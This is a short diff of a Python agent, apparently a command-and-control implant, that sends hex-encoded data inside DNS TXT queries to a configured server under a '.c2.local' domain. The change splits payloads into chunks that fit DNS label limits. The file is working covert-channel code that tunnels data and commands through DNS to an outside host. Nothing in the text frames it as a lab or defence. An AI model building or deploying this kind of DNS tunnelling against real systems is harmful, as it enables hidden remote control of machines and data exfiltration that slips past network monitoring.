@@ -9,10 +9,13 @@ KEY = bytes.fromhex(os.getenv("C2_KEY"))
 SERVER = os.getenv("C2_SERVER")        # RPi IP address
 SESSION_ID = os.getenv("SESSION_ID")   # unique per agent
 INTERVAL = 5                           # poll every 5 seconds
+CHUNK = 62                             # max hex chars per DNS label (limit is 63)
 
 def send_query(payload: bytes) -> bytes:
-    encoded = payload.hex()
-    qname = f"{encoded}.{SESSION_ID}.c2.local"
+    hex_payload = payload.hex()
+    chunks = [hex_payload[i:i+CHUNK] for i in range(0, len(hex_payload), CHUNK)]
+    # format: {count}.{chunk1}.{chunk2}...{session_id}.c2.local
+    qname = f"{len(chunks)}.{'.'.join(chunks)}.{SESSION_ID}.c2.local"
     resolver = dns.resolver.Resolver()
     resolver.nameservers = [SERVER]
     answer = resolver.resolve(qname, "TXT")
